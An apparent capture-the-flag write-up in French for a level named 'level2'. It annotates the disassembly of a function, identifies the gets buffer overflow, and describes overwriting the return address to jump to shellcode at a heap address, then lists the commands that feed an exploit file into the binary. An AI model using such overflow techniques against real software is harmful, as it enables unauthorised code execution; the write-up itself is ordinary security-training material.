disas p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:  mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax -> allocation buffer (= 76)
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt> -> faille à exploiter
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt> -> faille possible mais suivi
                                                        d'un exit donc pas pratique
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:leave  
   0x0804853e <+106>:ret 


Il y a deux fonctions que l'on peut exploiter : gets et printf seulement le printf est
suivi d'un exit on peut donc pas ecraser sont adresse de retour.

On va donc utiliser le gets pour lancer cette fois ci un shellcode directement car il 
n'y a pas de fonction caché comme au niveau précédant.

breakpoint before leave in p puis info register -> eax est une valeur de retour qui
contient notre string, elle a l'adresse 0x804a008 qui est celle qu'on va utiliser
pour ecraser la prochaine instruction

Pour trouver le padding j'ai un peu tatonné en testant différente valeur dans gdb.

On met l´exploit dans tmp et on le run pour obtenir le resultat dans tmp aussi :
python /tmp/exploit2 > /tmp/test2

Puis on lance le resultat dans level2 :
cat /tmp/test2 | ./level2 
